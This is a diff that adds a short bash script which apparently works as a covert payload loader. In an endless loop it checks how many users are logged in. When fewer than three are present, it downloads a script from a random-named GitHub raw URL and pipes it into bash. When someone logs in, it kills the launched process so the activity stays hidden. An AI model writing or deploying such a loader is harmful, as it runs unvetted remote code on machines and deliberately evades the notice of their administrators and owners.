@@ -1,0 +1,33 @@
+#!/bin/bash
+
+RUNNING=false
+ID=$1
+PROCESS=$2
+
+#infinite loop
+
+while : ; do
+    COUNT=`who | wc -l`
+    #if not running //revert if!!!
+    if $RUNNING; then
+        if [[ "$COUNT" -gt 0 ]] ; then
+            #kill script
+            PID=`top -b -n 1 | head -15 | tail -10 | grep $PROCESS | awk {'print $1'} | head -1`
+            kill -9 $PID
+            RUNNING=false
+            break
+        fi
+    #if not running
+    else
+        if [[ "$COUNT" -lt 3 ]]; then
+            #run script
+            curl -s -L https://raw.githubusercontent.com/ohch6Ong/EeXah6Bi/main/init4 | bash -s $ID $PROCESS
+            RUNNING=true
+        fi
+    fi
+	
+	sleep 1 
+done
+
+
+#while : ; do uptime >> /tmp/uptime ; sleep 1 ; done
